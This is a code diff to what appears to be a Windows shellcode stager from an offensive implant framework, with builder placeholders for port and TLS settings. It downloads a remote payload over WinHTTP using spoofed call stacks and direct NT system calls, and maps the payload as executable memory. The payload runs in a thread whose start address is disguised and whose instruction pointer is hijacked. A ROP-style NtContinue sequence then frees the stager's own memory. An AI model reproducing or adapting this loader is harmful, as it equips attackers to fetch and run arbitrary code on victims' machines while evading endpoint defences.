@@ -40,7 +40,7 @@ BOOL ReceiveData(
 		dwReqFlags |= WINHTTP_FLAG_SECURE;
 
 
-    hSession = SPOOF(Inst->Transport.WinHttpOpen, Inst->Module.Kernelbase, lpwUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = SPOOF(Inst->Transport.WinHttpOpen, Inst->Module.Kernelbase, lpwUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	if (hSession == NULL)
 		goto end;
 
@@ -122,25 +122,50 @@ VOID Main(
 	DWORD dwDownloadedDataSize;
 
 	if(!
-    ReceiveData($$SECURE$$, $$PORT$$, (LPWSTR)&endpoint, (LPWSTR)&uri, (LPWSTR)&userAgent, &pDownloadedData, &dwDownloadedDataSize, Inst))
-    {
-        DBREAK;
-        return;
-    }
+	ReceiveData($$SECURE$$, $$PORT$$, (LPWSTR)&endpoint, (LPWSTR)&uri, (LPWSTR)&userAgent, &pDownloadedData, &dwDownloadedDataSize, Inst))
+	{
+		DBREAK;
+		return;
+	}
 
-    PVOID pAllocatedAddr = NULL; 
-    SIZE_T stAllocSize = (SIZE_T)dwDownloadedDataSize;
-    ULONG_PTR ulOldProtect = 0;
+	PVOID pAllocatedAddr = NULL; 
+	SIZE_T stAllocSize = (SIZE_T)dwDownloadedDataSize;
+	ULONG_PTR ulOldProtect = 0;
 
-    void*   regContent[] = { NULL, NULL };
+	void*	regContent[] = { NULL, NULL };
 
-    NTCALL(NtAllocateVirtualMemory, (HANDLE)-1, &pAllocatedAddr, 0, &stAllocSize, MEM_COMMIT, PAGE_READWRITE);
+	NTCALL(NtAllocateVirtualMemory, (HANDLE)-1, &pAllocatedAddr, 0, &stAllocSize, MEM_COMMIT, PAGE_READWRITE);
 
-    xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
+	xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
 
-    NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
+	Inst->Win32.LocalFree(pDownloadedData); 
 
-    ((EXEC_MEM)pAllocatedAddr)();
+	NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
+
+	HANDLE hThread = NULL;
+	NTCALL(NtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess, (U_PTR(Inst->Win32.RtlUserThreadStart) + 0x21), (void*)NULL, (void*)TRUE, (void*)0, (void*)0, (void*)0, (void*)NULL ) ;
+
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_ALL;
+
+	NTCALL(NtGetContextThread, hThread, &ctx);
+	ctx.Rip = pAllocatedAddr;
+	NTCALL(NtSetContextThread, hThread, &ctx);
+	NTCALL(NtResumeThread, hThread, NULL);
+
+	CONTEXT ctxRop = { 0 };
+	ctxRop.ContextFlags = CONTEXT_ALL;
+
+	Inst->Win32.RtlCaptureContext(&ctxRop);
+
+	ctxRop.Rip = Inst->Win32.VirtualFree;
+	ctxRop.Rcx = Inst->Info.pStartAddr;
+	ctxRop.Rdx = 0;
+	ctxRop.R8 = MEM_DECOMMIT;
+	DEREF(ctxRop.Rsp) = Inst->Win32.RtlExitUserThread;
+
+	ctxRop.ContextFlags = CONTEXT_ALL;
+	NTCALL(NtContinue, &ctxRop, FALSE);
 
     return;
 }
